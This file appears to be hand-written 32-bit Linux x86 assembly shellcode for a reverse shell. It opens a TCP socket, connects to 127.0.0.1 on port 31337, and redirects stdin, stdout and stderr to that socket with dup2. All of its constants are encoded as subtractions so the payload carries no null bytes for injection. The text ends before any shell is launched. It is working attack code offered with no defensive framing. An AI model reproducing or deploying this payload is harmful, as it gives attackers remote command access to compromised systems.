#create new stack frame
push %ebp
movl %esp, %ebp

subl $4, %esp #int sockfd

subl $16, %esp # addr
movw $0x1112, (%esp) # addr.family = AF_INET =2
subw $0x1110, (%esp)
movw $0x697A, 2(%esp) # addr.port = (bigendian) 31337
movl $0x1111118F, 4(%esp) # 127.0.0.1 in big endian(0100007F)
subl $0x10111110, 4(%esp)

subl $12, %esp # parameter for socket
movl $0x11111112, (%esp) # AF_INET = 2
subl $0x11111110, (%esp) # 
movl $0x11111111, 4(%esp) # SOCKET_STREAM = 1
subl $0x11111110, 4(%esp)
xorl %eax, %eax #0
movl %eax, 8(%esp) 

movl $0x11111177, %eax #socket call 0x66
subl $0x11111111, %eax 
movl $0x11111111, %ebx #sys_socket = 1
subl $0x11111110, %ebx
movl %esp, %ecx #ptr to parameter

int $0x80 #call socket_socket

movl %eax, -4(%ebp) #mov return value to sockfd

subl $12, %esp # parameter for connect
movl %eax, (%esp) # sockfd
movl %ebp, 4(%esp) # &addr
subl $20,4(%esp)
movl $0x11111121, 8(%esp) # size of server addr = 16 = 0x10
subl $0x11111111, 8(%esp)

movl $0x11111177, %eax #socket call 0x66
subl $0x11111111, %eax 
movl $0x11111113, %ebx #sys_connect = 3
subl $0x11111110, %ebx
movl %esp, %ecx #ptr to parameter

int $0x80 #call socket-connect

#replace stdin, out, and err with socketfd
movl $0x1111114f, %eax #syscall dup2 = 0x3f
subl $0x11111110, %eax
movl -4(%ebp),%ebx #oldfd
movl $0x11111111, %ecx #newfd = 0
subl $0x11111111, %ecx
int $0x80

movl $0x1111114f, %eax #syscall dup2 = 0x3f
subl $0x11111110, %eax
movl -4(%ebp),%ebx #oldfd
movl $0x11111111, %ecx #newfd = 1
subl $0x11111110, %ecx
int $0x80

movl $0x1111114f, %eax #syscall dup2 = 0x3f
subl $0x11111110, %eax
movl -4(%ebp),%ebx #oldfd
movl $0x11111112, %ecx #newfd = 2
subl $0x11111110, %ecx
int $0x80


